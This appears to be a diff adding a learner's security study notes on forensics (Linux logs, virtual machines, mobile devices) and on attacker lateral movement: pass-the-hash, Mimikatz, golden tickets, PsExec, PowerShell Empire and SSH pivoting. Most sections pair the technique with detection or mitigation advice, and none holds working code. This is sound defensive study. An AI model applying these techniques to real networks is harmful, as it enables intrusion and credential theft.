+	-w, same as who, but will return remote host, idle time, execution time of process etc.
+	-rwho, same as who, but runs on client/server architecture
+	-lastlog, log-on history from /var/log/lastlog file, display account name, TTY, remote host, last login time
+	-faillog, displays only auth failures
+
+----
+
+Virtualization Forensics
+
+-virtualization provides numerous security challenges
+-process and memory analysis
+	-can be performed by VM Introspection or analyzing save state files
+	- VMI, uses tools installed to the hypervisor to retrieve pages of memory for analysis
+	- Saved State Files, suspending VM memory files are loaded into a memory analysis tool
+	- Persistend Data Acquisition
+		- acquiring adata from virtual hard drives, other virtualized mass storage devices to an image-based format
+		- necessary to follow forensics procedures to preserve original data as evidence
+- File Carving, of a VM hard drive can identify files in the unallocated and slack space
+	- VM hosts utilize proprietary file systems (VMFS from vmware) which can make disk analysis difficult
+	- can be used to reconstruct files that are fragmented across the host file system
+- Lost System Logs
+	- VM are optimized to spin up when needen and be destroyed when no longer needed
+	- config VMs to log event to SIEM to prevent log loss
+
+----
+
+Mobile Forensics
+
+Data Collection
+- tools that image mobile devices RAM and flash memory used for persistent storage (soldered to system board)
+- iOS/Android (modern) have encryption enabled by default
+
+Extraction and analysis methods
+- analysis techniques for mobile devices is like that of win/linux ws since most mobile devices rely on unix-like os systems
+
+-Manual extraction
+-Logical extraction, data backup to icloud > download
+-File System extraction, copy of unencrypted data
+-Call data extraction, pull out info from SIM-card
+
+Mobile Device Forensics Software
+- Cellebrite
+	- evidence ectraction, from mobile, cloud data and metadata using a universal forensic extraction device (UFED)
+- Mobile Phone Examiner Plus (MPE+)
+	- FTK for mobiles
+- EnCase Portable
+	- mobile version of EnCase
+
+Carrier Provider Logs
+ -any records of device activity that could be acquired from the mobile device's cellular service provider with the use of a warrant
+-call details, voicemail, SMS, MMS, IPs, Session, Geolocation data
+
+PII has short retention period due privacy laws
+
+
+
+
+Lateral movement is a technique to progressively move through your network to search for key data and assets that are ultimately the target of the attack campaign
+
+Identifying irregular p2p comm can identify lateral movement
+
+Pivoting, use of one infected pc to attack other systems to avoid restrictions such as firewalls
+
+----
+
+Pass the Hash
+
+network based attack, steal hashed user cred > use them as-is to try authenticate to same network
+- can work on SMB or Kerberos -like network
+- can be used to elevate privileges, local admin pw hash most likely on ws
+
+Mimikatz
+- open-source app, allows users to view and save auth credentials in order to perform pass the hash attacks
+- scans system memory for cached pws processed by lsass.exe (local sec auth subsystem service)
+
+Domain admin accounts only to be used on DCs, not WS!
+
+How to detect?
+1. difficult, cant easily differentiate from legit
+2. most AVs will block tools like Mimikatz
+3. restrict/protect high privileged domain accounts
+4. restrict/protect local admin account privileges
+5. restrict inbound traffic using Win firewall
+
+----
+
+Golden Ticket
+
+A Kerberos ticket that can grant other tickets in an Active Directory environment
+- can grant admin access to other domain members / DCs
+- golden tickets allow attackers to laterally move across the entire domain with ease
+
+Admin should change the "krbtgt" account pw regularly
+- need to reset twice, if breach suspected, will revoke old ones
+
+----
+
+Lateral Movement
+
+- Attacker can use any remote access protocol to move from host to host
+- Insecure pws make network sec weak and more susceptible to lateral movement
+
+- Remote Access Service
+	-any combination of hw/sw to enable remote access
+	-ssh,telnet,rdp,vnc, provide attacker ability for lateral movement
+
+-WMIC (Windows Management Instrumentation Command-Line)
+	- terminal interface, enables admins to run scripts to manage those computers
+	- can be a vector in post-attack lateral movement
+
+-PsExec
+	-alternative to Telnet etc. which utilizes the Windows SYSTEM account for privilege escalation
+
+- Windows PowerShell
+	- a task automation and configuration management framework from Microsoft, consists of a command-line shell and an associated scripting language
+	- PowerShell Empire -toolkit contains numerous prebuilt attack modules
+
+
+----
+
+Pivoting
+
+Pivoting, use of one infected pc to ATTACK other systems to avoid restrictions such as firewalls
+
+Port Forwarding
+- attacker uses a host as a pivot and is then able to access one of its open TCP/IP ports to send traffic from this port toa port of a host on a different subnet
+
+SSH can also be used to pivot to other hosts using the  -D flag which sets up a local proxy and port forwarding
+
+Attackers can chaing proxy servers together in order to continue pivoting from host to host until they reach a mission ciritcal host/server
+
+
+----
+
+
+
+
+
+
